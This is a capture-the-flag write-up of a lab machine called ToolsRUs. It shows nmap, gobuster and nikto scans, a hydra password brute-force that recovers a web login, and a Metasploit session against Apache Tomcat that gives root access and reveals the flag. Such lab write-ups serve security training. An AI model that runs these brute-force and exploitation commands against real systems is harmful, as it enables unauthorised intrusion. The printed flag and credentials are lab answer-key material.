# ToolsRUs

IP: 10.10.154.123

![image](https://user-images.githubusercontent.com/44063862/160221235-156f6012-65f8-4999-9204-590ac21d8733.png)

### Penetration Testing Methodology

![image](https://user-images.githubusercontent.com/44063862/160220590-db70b7dd-a85c-407f-b5d8-e42e9fa58dc3.png)

**Reconnasance**
* nmap

**Enumerating**
* gobuster
* hydra

**Exploitation**
* Apache Tomcat

**Privilege Escalation**
* Apache Tomcat/Coyote JSP engine 1.1

**Capture-the-flag**
* flag.txt

----------------------------------------------------------------
### Walkthrough

> nmap -A -v 10.10.154.123

![image](https://user-images.githubusercontent.com/44063862/160220987-1488e56b-495e-432b-b918-d18d0210edca.png)

From the nmap scanning. I found that 4 port open. Which is

* 22 (ssh)
* 80 (http)
* 1234 (http)
* 8009 (ajp13)

> gobuster dir -u 10.10.154.123 -w /root/Lists/directory-list-2.3-medium.txt

![image](https://user-images.githubusercontent.com/44063862/160221188-392ad5e9-feee-40ae-a7b8-10ae513d9ca2.png)

* /guidelines
* /protected

![image](https://user-images.githubusercontent.com/44063862/160221062-7041cfd6-1a21-43a5-ab6f-fecdf772b4f1.png)
--> msg for Bob 

![image](https://user-images.githubusercontent.com/44063862/160221118-9f0c0a30-8719-4f27-8898-9158da18f847.png)
--> need authentication

> hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.154.123 http-get /protected/

![image](https://user-images.githubusercontent.com/44063862/160221388-f0cc4148-fdef-4f19-8ab4-a5970257940f.png)

Username: Bob
Password: bubbles

**Other web service**

http://10.10.154.123:1234/

![image](https://user-images.githubusercontent.com/44063862/160221451-8e13a0aa-47fe-4626-9f74-e58369e92098.png)

Apache Tomcat/7.0.88

> nikto -h http://10.10.154.123/

![image](https://user-images.githubusercontent.com/44063862/160222653-dbc23994-9476-41de-bf8c-0b5a74ce12ad.png)

Apache/2.4.18

Find vulnerability for **Apache Tomcat/Coyote JSP engine 1.1**

```
msfconsole -q
set HttpUsername bob
set HttpPassword bubbles
set RHOSTS 10.10.231.52
set RPORT 1234
options
```

![image](https://user-images.githubusercontent.com/44063862/160222883-5cfe51ca-f2dc-483e-9d34-759e7d222022.png)

> run

![image](https://user-images.githubusercontent.com/44063862/160223129-1db51206-c050-4bc3-96cc-4a69ad9a25d9.png)

> getuid

![image](https://user-images.githubusercontent.com/44063862/160223136-11d8b898-555b-4375-9567-d98739e6e6ab.png)

> cat /root/flag.txt

![image](https://user-images.githubusercontent.com/44063862/160223208-dfb7ed1c-a715-451d-99ba-1302c8622dc9.png)

flag.txt: ff1fc4a81affcc7688cf89ae7dc6e0e1


